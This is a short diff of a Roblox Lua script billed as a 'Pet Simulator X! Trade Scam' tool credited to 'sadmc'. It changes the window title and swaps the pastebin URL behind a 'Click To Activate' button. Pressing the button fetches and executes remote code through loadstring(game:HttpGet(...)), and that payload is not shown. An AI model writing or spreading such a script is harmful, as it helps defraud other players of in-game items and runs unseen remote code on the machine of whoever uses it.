@@ -1,5 +1,5 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("PSX Trade Scam PRIVATE 4.1", "Midnight")
+local Window = Library.CreateLib("[⚡ANIME] Pet Simulator X! 🐾 - Trade Scam V4.5.2", "Synapse")
     -- MAIN
     local Main = Window:NewTab("Credits")
     local MainSection = Main:NewSection("Script Made By sadmc")
@@ -9,6 +9,6 @@ local Window = Library.CreateLib("PSX Trade Scam PRIVATE 4.1", "Midnight")
 
     MainSection:NewButton("Click To Activate", "Made by Sadmc", function()
    
-  loadstring(game:HttpGet('https://pastebin.com/raw/AXNa1gAx'))()
+  loadstring(game:HttpGet('https://pastebin.com/raw/G0MT3Cwc'))()
       end)
 
